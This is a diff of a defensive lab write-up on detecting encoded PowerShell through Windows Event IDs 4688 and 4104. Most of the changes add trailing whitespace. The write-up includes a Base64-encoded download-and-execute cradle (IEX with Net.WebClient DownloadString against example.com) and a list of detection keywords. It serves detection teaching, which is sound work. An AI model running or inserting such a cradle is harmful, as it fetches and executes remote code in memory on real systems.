@@ -214,18 +214,18 @@ Event ID 4104 – PowerShell Script Block Logging
 
 Lab Environment
 
-Attacker System
-Kali Linux VM
+Attacker System          
+Kali Linux VM             
 IP Address: 192.168.101.130
 
-Target System
-Windows Workstation
+Target System            
+Windows Workstation                             
 IP Address: 192.168.101.134
 
-Network
+Network                                              
 Local LAN (192.168.101.0/24)
 
-Attack Technique
+Attack Technique                                               
 
 Attackers frequently use encoded PowerShell commands to hide malicious activity. Instead of executing a readable command, the script is encoded into Base64 and passed to PowerShell using the -EncodedCommand parameter.
 
@@ -239,7 +239,7 @@ Attack Simulation
 
 To simulate this technique, the following encoded PowerShell command was executed on the Windows system:
 
-powershell -EncodedCommand SQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACIAKQA=
+powershell -EncodedCommand                                             SQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACIAKQA=
 
 When decoded, this command becomes:
 
@@ -248,13 +248,13 @@ IEX (New-Object Net.WebClient).DownloadString("http://example.com
 
 Explanation:
 
-IEX (Invoke-Expression)
+IEX (Invoke-Expression)                                                          
 Executes a command directly in memory.
 
-New-Object Net.WebClient
+New-Object Net.WebClient                                         
 Creates a web client object.
 
-DownloadString()
+DownloadString()                                                            
 Downloads remote content from a web server.
 
 This behavior is commonly used by fileless malware to download and execute malicious payloads.
@@ -274,17 +274,17 @@ This event records every new process created on the system.
 
 The following suspicious indicators were observed:
 
-New Process Name
+New Process Name                                                     
 powershell.exe
 
-Command Line
+Command Line                                                                            
 powershell.exe -EncodedCommand
 
 The presence of -EncodedCommand is a strong indicator of potentially malicious PowerShell usage and is frequently investigated by SOC analysts.
 
 Event ID 4104 – PowerShell Script Block Logging
 
-Location
+Location                                                                                
 Applications and Services Logs → Microsoft → Windows → PowerShell → Operational
 
 Script Block Logging records the actual PowerShell code that was executed.
@@ -300,22 +300,22 @@ Why This Matters
 
 Encoded PowerShell commands are commonly used by attackers because they:
 
-Hide malicious commands from simple detection rules
-Obfuscate scripts to evade security monitoring
+Hide malicious commands from simple detection rules                                         
+Obfuscate scripts to evade security monitoring                                 
 Execute code directly in memory without writing files to disk
 
 This technique is frequently observed in attacks involving:
 
-Cobalt Strike
-Emotet
-TrickBot
+Cobalt Strike                                  
+Emotet                                                 
+TrickBot                                                     
 PowerShell Empire
 
 For this reason, SOC analysts closely monitor PowerShell activity, especially commands that contain:
 
--EncodedCommand
-Invoke-Expression (IEX)
-Net.WebClient
+-EncodedCommand                                                             
+Invoke-Expression (IEX)                                                                    
+Net.WebClient                                                                       
 DownloadString
 
 Key Takeaways
@@ -324,8 +324,8 @@ This lab demonstrates how encoded PowerShell activity can be detected using buil
 
 Security analysts can identify suspicious behavior by:
 
-Monitoring process creation events (Event ID 4688)
-Inspecting PowerShell Script Block logs (Event ID 4104)
+Monitoring process creation events (Event ID 4688)                                                          
+Inspecting PowerShell Script Block logs (Event ID 4104)                                                                         
 Investigating commands containing encoded payloads
 
 Proper logging configuration significantly improves visibility into PowerShell-based attacks.
